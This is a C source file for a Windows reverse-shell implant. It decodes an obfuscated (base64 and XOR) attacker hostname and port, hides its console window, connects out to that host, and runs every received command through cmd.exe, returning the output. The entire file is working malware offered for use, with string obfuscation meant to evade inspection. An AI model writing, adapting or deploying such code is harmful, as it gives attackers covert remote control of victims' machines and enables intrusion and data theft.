#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

#pragma comment(lib, "ws2_32.lib")

static const unsigned char KEY[32] = {
    'X','X','X','X','X','X','X','X','X','X','X','X','X','X','X','X',
    'X','X','X','X','X','X','X','X','X','X','X','X','X','X','X','X'
};

// Paste this from enc.c
#define B64_HOST "KiksITN1aWhrdWp1aWtsdWlvYHYqLTZ2KDE2Pz8hdT4qPT12NDE2MA=="
#define B64_PORT "a21gamA="

static const char BASE64_CHARS[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int base64_table[256];

void init_base64_table() {
    memset(base64_table, -1, sizeof(base64_table));
    for (int i = 0; i < 64; ++i) {
        base64_table[(unsigned char)BASE64_CHARS[i]] = i;
    }
}

int base64_decode(const char* in, unsigned char* out) {
    int in_len = strlen(in);
    int out_idx = 0;
    int block = 0, bits = 0;

    for (int i = 0; i < in_len; ++i) {
        char c = in[i];
        if (c == '=') break;

        int val = base64_table[(unsigned char)c];
        if (val == -1) continue;

        block = (block << 6) | val;
        bits += 6;

        if (bits >= 8) {
            out[out_idx++] = (block >> (bits - 8)) & 0xFF;
            bits -= 8;
        }
    }
    return out_idx;
}

void xor_decrypt(const unsigned char* in, int in_len, unsigned char* out, const unsigned char* key, int key_len) {
    for (int i = 0; i < in_len; ++i) {
        out[i] = in[i] ^ key[i % key_len];
    }
}

DWORD WINAPI reverse_shell_thread(LPVOID lpParam) {
    int PORT = (int)(intptr_t)lpParam;

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET)
        return 1;

    unsigned char raw_host[64] = {0};
    int raw_host_len = base64_decode(B64_HOST, raw_host);
    unsigned char dec_host[64] = {0};
    xor_decrypt(raw_host, raw_host_len, dec_host, KEY, 32);

    unsigned char raw_port[16] = {0};
    int raw_port_len = base64_decode(B64_PORT, raw_port);
    unsigned char dec_port[16] = {0};
    xor_decrypt(raw_port, raw_port_len, dec_port, KEY, 32);

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons((short)atoi((char*)dec_port));

    // Resolve hostname (works for IP strings AND domains)
    struct hostent* he = gethostbyname((char*)dec_host);
    if (!he) {
        closesocket(s);
        WSACleanup();
        return 1;
    }
    addr.sin_addr.s_addr = *(unsigned long*)he->h_addr_list[0];

    if (WSAConnect(s, (struct sockaddr*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) != 0) {
        closesocket(s);
        WSACleanup();
        return 1;
    }

    char recv_buf[1024];
    char cmd_buf[2048];

    while (1) {
        int recv_len = recv(s, recv_buf, sizeof(recv_buf) - 1, 0);
        if (recv_len <= 0)
            break;

        recv_buf[recv_len] = '\0';

        if (_stricmp(recv_buf, "exit") == 0 || _stricmp(recv_buf, "quit") == 0)
            break;

        snprintf(cmd_buf, sizeof(cmd_buf), "cmd.exe /c \"%s\"", recv_buf);

        FILE* pipe = _popen(cmd_buf, "r");
        if (pipe) {
            char output_buf[4096] = {0};
            char line_buf[256];

            while (fgets(line_buf, sizeof(line_buf), pipe)) {
                strncat(output_buf, line_buf, sizeof(output_buf) - strlen(output_buf) - 1);
            }
            _pclose(pipe);

            strcat(output_buf, "\n");
            send(s, output_buf, strlen(output_buf), 0);
        } else {
            send(s, "\n", 1, 0);
        }
    }

    closesocket(s);
    WSACleanup();
    return 0;
}

int main() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL)
        ShowWindow(hwnd, SW_HIDE);

    init_base64_table();

    unsigned char raw_port[16] = {0};
    int raw_port_len = base64_decode(B64_PORT, raw_port);
    unsigned char dec_port[16] = {0};
    xor_decrypt(raw_port, raw_port_len, dec_port, KEY, 32);

    int PORT = atoi((char*)dec_port);

    HANDLE hThread = CreateThread(NULL, 0, reverse_shell_thread, (LPVOID)(intptr_t)PORT, 0, NULL);
    if (hThread != NULL)
        CloseHandle(hThread);

    while (1)
        Sleep(1000);

    return 0;
}
